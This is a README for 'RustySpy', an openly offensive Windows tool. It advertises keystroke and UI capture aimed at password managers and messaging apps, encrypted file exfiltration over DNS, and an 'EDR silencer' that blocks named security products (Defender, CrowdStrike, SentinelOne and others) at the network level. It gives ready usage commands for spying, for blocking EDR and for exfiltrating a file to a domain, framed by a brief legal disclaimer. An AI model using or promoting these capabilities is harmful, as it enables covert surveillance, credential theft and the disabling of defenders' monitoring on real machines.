# RustySpy

A powerful Windows UI monitoring and DNS exfiltration tool written in Rust, combining advanced UI event capture capabilities with secure data exfiltration and EDR suppression features.

## Core Features

### Windows UI Monitoring
- Real-time capture of UI events using Microsoft's UI Automation framework
  - Window creation and destruction events
  - Focus changes and text selection
  - Property changes and value updates
  - Keyboard input monitoring
- Application-specific handlers for enhanced monitoring:
  - Firefox (including WhatsApp Web and Slack)
  - Chrome
  - KeePass
  - Windows Explorer
- EDR (Endpoint Detection and Response) process management
  - Detection and identification of EDR processes
  - Network traffic blocking for EDR processes using WFP
  - Support for major EDR solutions (Microsoft Defender, SentinelOne, etc.)

### Data Exfiltration
- Secure file exfiltration over DNS
- AES-256-CTR encryption with random IV
- GZIP compression
- Base64/Base32 encoding support
- DNS over HTTPS (DoH) support for Google and Cloudflare
- Custom DNS server support
- Configurable throttling and chunk sizes
- Comprehensive error handling and logging
  
<img width="1002" alt="image" src="https://github.com/user-attachments/assets/4d71aee2-1aa5-4d09-840b-b351ea29c07d" />

## Building

This project was developed on macOS and uses Docker for cross-compilation to Windows. Here's how to build it:

### Prerequisites

1. Install Docker Desktop for Mac:
```bash
brew install --cask docker
```

2. Install Rust and Cargo (optional, only needed for macOS builds):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

### Building for Windows (Recommended)

The project uses Docker for cross-compilation to ensure consistent Windows builds from macOS:

1. Clone the repository:
```bash
git clone https://github.com/yourusername/rustyspy.git
cd rustyspy
```

2. Build using Docker:
```bash
# Build the Docker image and create the Windows executable
docker build -t rustyspy-builder .
docker run --rm -v $(pwd)/target:/output rustyspy-builder
```

The Windows executable will be available at:
```
target/x86_64-pc-windows-gnu/release/rustyspy.exe
```

### Building for macOS (Optional)

If you want to build for macOS:
```bash
cargo build --release
```

The macOS executable will be available at:
```
target/release/rustyspy
```

## Usage

The tool provides two main modes of operation:

### 1. UI Monitoring Mode

List available windows for monitoring:
```bash
rustyspy find
```

Monitor specific windows or processes:
```bash
rustyspy spy [OPTIONS]

Options:
  -w, --window <TITLE>     Window title to monitor
  -p, --pid <PID>          Process ID to monitor
  -l, --logfile <FILE>     Log file for events
  -i, --ignore-handlers    Ignore app-specific handlers
  -t, --timeout <SECS>     Event processing interval [default: 1]
      --no-uia-events      Disable UIA events
      --no-property-events Disable property change events
      --block-edr          Block EDR processes
  -d, --debug             Enable debug logging
```

### 2. Data Exfiltration Mode

```bash
rustyspy exfil <file> <domain> <password> [OPTIONS]

Arguments:
  <file>     File to exfiltrate
  <domain>   Target domain name
  <password> Encryption password

Options:
  --base32                  Use base32 encoding instead of base64
  --throttle <MS>          Delay between requests in milliseconds
  --request-size <SIZE>    Maximum DNS request size (default: 255)
  --label-size <SIZE>      Maximum DNS label size (default: 63)
  --doh-provider <PROVIDER> DNS over HTTPS provider (google/cloudflare)
  --dns-server <SERVER>    Custom DNS server
```

### Examples

1. Monitor a specific window and log events:
```bash
rustyspy spy -w "Notepad" -l events.log
```

2. Monitor a process with EDR blocking:
```bash
rustyspy spy -p 1234 --block-edr
```

3. Exfiltrate data using DNS:
```bash
rustyspy exfil secret.txt example.com mypassword --base32 --throttle 1000
```

## How It Works

### UI Automation Monitoring
The tool leverages Microsoft's UI Automation (UIA) framework to:
1. Attach to specified windows/processes
2. Register event handlers for various UI events
3. Process and log events in real-time
4. Apply application-specific handlers for enhanced monitoring

### EDR Silencer
The EDR (Endpoint Detection and Response) silencer is a sophisticated component that prevents security tools from detecting and reporting the tool's activities:

1. **Process Detection**
   - Maintains a comprehensive list of known EDR processes including:
     - Microsoft Defender (MsMpEng.exe)
     - CrowdStrike (csfalcon.exe, csshell.exe)
     - SentinelOne (SentinelAgent.exe)
     - Cylance (CylanceSvc.exe, CylanceUI.exe)
     - Tanium (TaniumClient.exe, TaniumCX.exe)
     - Elastic EDR (elastic-endpoint.exe)
     - And many others

2. **Network Filtering**
   - Uses Windows Filtering Platform (WFP) API to create network filters
   - Creates transaction-based filter operations for atomic changes
   - Implements both inbound and outbound traffic blocking
   - Operates at the kernel level for maximum effectiveness

3. **Implementation Details**
   ```rust
   // Example of how filters are applied
   const EDR_PROCESSES: &[&str] = &[
       "MsMpEng.exe",
       "winlogbeat.exe",
       "SentinelAgent.exe",
       // ... other processes
   ];
   ```

4. **Operation Sequence**
   1. Elevates privileges to gain necessary access rights
   2. Enumerates running processes to identify EDR software
   3. Creates WFP transaction for atomic filter application
   4. Applies network filters to identified processes
   5. Commits transaction to ensure all filters are applied
   6. Monitors for new EDR processes and updates filters as needed

5. **Error Handling**
   - Graceful handling of insufficient privileges
   - Transaction rollback on partial failures
   - Logging of all blocking operations
   - Cleanup of filters on program termination

### DNS Exfiltration
The exfiltration process:
1. Reads and compresses target file using GZIP
2. Encrypts data using AES-256-CTR with a random IV
3. Encodes data using Base64/Base32
4. Splits data into DNS-compatible chunks
5. Transmits chunks via DNS requests with optional throttling

## Security Features

- AES-256-CTR encryption with random IV for each session
- Password-based key derivation
- GZIP compression before encryption
- Support for secure DNS providers (Google/Cloudflare DoH)
- Comprehensive event logging and error handling
- EDR process detection and management

## Advanced Features

### EDR Silencing Capabilities
- **Process Management**
  - Real-time EDR process detection
  - Dynamic filter updates
  - Support for custom process lists

- **Network Control**
  - Layer 3/4 traffic filtering
  - Protocol-specific blocking
  - Bidirectional traffic control

- **Stealth Operations**
  - Transaction-based filter application
  - Kernel-level operation
  - Minimal logging footprint

### Error Codes
```rust
pub enum ErrorCode {
    Success = 0,
    InvalidArgument = 1,
    InsufficientPrivileges = 2,
    WfpError = 3,
    UnknownError = 4,
}
```

## Development

The project uses several Rust crates:
- `windows` for UI Automation and WFP integration
- `aes` and `ctr` for encryption
- `flate2` for compression
- `base64` and `data-encoding` for encoding
- `clap` for CLI argument parsing
- `log` and `env_logger` for logging

## License

MIT License

Copyright (c) 2024 RustySpy Contributors

## Contributing

Feel free to contribute to the project by submitting pull requests or reporting issues.

## Security Considerations

This tool is intended for legitimate security testing and research purposes only. Users must:
1. Ensure they have explicit permission to use this tool
2. Comply with all applicable laws and regulations
3. Use the tool responsibly and ethically
4. Implement appropriate security controls
5. Not use the tool for malicious purposes

The authors disclaim any responsibility for misuse or illegal activities conducted with this tool.
